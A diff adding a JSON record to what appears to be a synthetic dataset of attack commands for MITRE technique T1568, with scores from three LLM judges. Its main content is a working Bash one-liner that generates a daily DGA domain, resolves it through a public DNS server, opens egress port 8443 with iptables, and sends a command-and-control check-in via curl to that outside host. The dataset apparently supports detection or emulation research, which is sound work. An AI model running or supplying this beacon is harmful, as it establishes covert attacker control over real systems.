@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "FQDN=$(python3 - <<'EOF'\nimport hashlib, time\nprint(hashlib.md5((\"epsilon\"+time.strftime(\"%Y%m%d\")).encode()).hexdigest()[:12]+\".update-status.info\")\nEOF\n); PORT=8443; IP=$(dig +short A \"$FQDN\" @9.9.9.9 | shuf -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; curl -sSf --resolve \"${FQDN}:${PORT}:${IP}\" --retry 1 --connect-timeout 3 \"https://${FQDN}:${PORT}/checkin?pid=$$\"",
+  "explanation": "Builds a daily-rotating DGA domain, resolves it via Quad9, and performs a check-in to an alternate TLS port while pinning the resolved IP.",
+  "rationale_steps": [
+    "Generate DGA from a daily seed",
+    "Resolve via chosen public DNS server",
+    "Permit egress to 8443 with iptables",
+    "Send C2 check-in bound to resolved IP"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-c0d94fa6",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for the Python heredoc, variable assignments, and command chaining.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements the T1568 Dynamic Resolution technique by using a deterministic DGA algorithm based on date to generate domains daily, resolving via external DNS, and establishing a connection to the generated domain on a non-standard port with proper error handling.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:14:36.467988Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct bash and python syntax, balanced quoting, and valid flag formats throughout without any parsing errors.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements DGA, dynamic resolution via external DNS, and a sophisticated C2 beacon using IP pinning, but the `iptables` command will fail due to the specified 'Privilege: None,' creating a minor realism gap in operational success.",
+        "combined_score": 4.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:14:58.610784Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses a well-formed here-document within command substitution, balanced quoting/parentheses, valid flags for dig/iptables/curl, and proper separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements a DGA-based daily FQDN, resolves via Quad9, selects an IP, and performs a pinned HTTPS check-in on a non-standard port aligning with T1568, but the iptables step likely fails without root privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T07:15:01.104387Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
